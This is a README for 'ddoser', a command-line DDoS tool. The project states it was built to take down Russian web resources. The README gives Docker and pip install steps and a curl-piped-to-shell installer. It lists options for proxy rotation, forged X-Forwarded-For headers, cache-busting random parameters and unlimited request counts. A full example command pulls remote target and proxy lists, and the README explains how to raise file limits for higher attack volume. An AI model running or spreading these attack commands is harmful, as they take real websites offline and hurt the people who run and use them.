# The you seddoser
Small application for ddos attack, was developed special for kill russian's resources :)
# Contacts
If you have a questions or any proposal/bug thern pls contact us [ddoser telegram group](https://t.me/+eodJuvlTiK9hYWYy)
## Docker run (easy way)
Install docker https://docs.docker.com/engine/install/
```shell
# with default urls and proxies
docker run --pull always --ulimit nofile=100000:100000 -it imsamurai/ddoser
# with custom params
docker run --pull always --ulimit nofile=100000:100000 -it imsamurai/ddoser --target-urls-file sime.txt ... (check usage section)
# help
docker run --pull always --ulimit nofile=100000:100000 -it imsamurai/ddoser --help
```
Each run will update ddoser inside.
## Install
### Linux
```shell
sudo apt install python3
sudo apt install python3-pip
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip install -r requirements.txt
```
### MacOs
Download and install python3.7-3.9 form here https://www.python.org/downloads/macos/ if you don't have it
or install by brew
```shell
brew install python@3.9
brew link python@3.9
```
### Common for any system
```shell
git clone https://github.com/taransergey/ddoser.git
cd ddoser/
pip install -r requirements.txt
```
### install by helper script
Also you can install in Linux by command:
```shell
curl https://raw.githubusercontent.com/taransergey/ddoser/main/ddoser_install.sh | sh
```

## Run
```shell
Usage: ddoser.py [OPTIONS]

  Run ddoser

Options:
  --target-url TEXT            ddos target url
  --target-urls-file TEXT      path or url to file contains urls to ddos
  --proxy-url TEXT             url to proxy resourse
  --proxy-file TEXT            path to file with proxy list
  --concurrency INTEGER        concurrency level
  --count INTEGER              requests count (0 for infinite)
  --timeout INTEGER            requests timeout
  -v, --verbose                Show verbose log
  --ignore-response            do not wait for response body
  --with-random-get-param      add random get argument to prevent cache usage
  --user-agent TEXT            custom user agent
  --log-to-stdout              log to console
  --restart-period INTEGER     period in seconds to restart application (reload proxies ans targets)
  --random-xff-ip              set random ip address value for X-Forwarder-For header
  --custom-headers TEXT        set custom headers as json
  --stop-attack INTEGER        stop the attack when the target is down after N tries
  --shuffle-proxy              Shuffle proxy list on application start
  -H, --header <TEXT TEXT>...  custom header
  --proxy-custom-format TEXT   custom proxy format like "{protocol}://{ip}:{port} {login}:{password}"
                               (ip and port is required, protocol can be set by --protocol)
  --help                       Show this message and exit.
```
proxy-file or proxy-url should contain proxy list in format like:
```text
ip1:port1#sock5
ip2:port2#sock4
ip3:port3#sock4 login:password
ip4:port4#http login:password
ip5:port5#http login:password
ip6:port6#https login:password
...
ipN:portN#sock4
```
### Example cmd
```shell
python3 ./ddoser.py --concurrency 150 --timeout 60 --with-random-get-param --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" --count 0 --log-to-stdout --target-urls-file https://raw.githubusercontent.com/maxindahouze/reactor/main/targets3.txt --proxy-url 'http://143.244.166.15/proxy.list' --restart-period 600 --random-xff-ip
```
## Notes
**ddoser** supports SOCKS4/5 and HTTP(s) proxies with or without authorization, also can start it directly without proxy

Use **--restart-period** parameter to periodically reloading targets and proxies list   

If you see an error `too many open files` then you can decrease concurrency/targets count but first of all
try to increase the limits:
### Linux/MacOS:
```shell
ulimit -n 100000
```
### WSL:
```shell
mylimit=100000
sudo prlimit --nofile=$mylimit --pid $$; ulimit -n $mylimit
```
